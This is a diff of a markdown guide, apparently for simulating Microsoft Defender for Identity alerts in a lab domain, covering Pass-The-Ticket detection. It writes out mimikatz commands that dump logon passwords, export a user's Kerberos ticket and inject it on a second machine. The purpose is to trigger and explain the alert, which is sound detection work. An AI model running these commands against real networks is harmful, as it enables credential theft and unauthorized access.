@@ -197,19 +197,19 @@ This detection is often miss-understanding; if you perform a Pass-The-Ticket fro
 What MDI can detect, without any client agent and even if the activity is seen from an unmanaged machine (without EPP or EDR), is one Kerberos ticket (TGT) was issued to a user on a specific machine (Name, IP) and the same ticket is seen coming from another machine (Name, IP), so MDI can trigger a Suspected identity theft… 
 In this detection a Kerberos ticket is seen used on two (or more) different computers.  
 
-On the machine 1 where a domain user is in used (logon as Task, service, RDP, Interactive..), from a command line run as local admin :
+On the machine 1 (ADMIN-PC) where a domain user is in used (logon as Task, Service, RDP, Interactive..), from a command line run as local admin :
 
 *mimikatz.exe privilege::debug*  
 *sekurlsa::logonpasswords*  
 *sekurlsa::tickets /export* => rename the Nuck's TGT file (or whatever) to nuck.kirbi
 
-On the machine 2, from a command line run as local admin :
+On the machine 2 (VICTIM-PC), from a command line run as local admin :
 
 *mimikatz.exe privilege::debug*  
 *kerberos::ptt nuck.kirbi*  
-*Quit*
-*Klist* => check if the TGT for nuck is loaded
-*net use * \\server.msdemo.local\c$ /u:msdemo\nuck* => the stolen TGT from machine 1 will be presented to a DC to issue a TGS and access will be granted if nuck has the permission on server.msdemo.local
+*Quit*  
+*Klist* => check if the TGT for nuck is loaded  
+Perfrom an ldap bind (digest) using for example LDP.exe => the stolen TGT from machine 1 will be presented to a DC to issue a TGS for the ldap query
 
 Detail in the alert:  
 
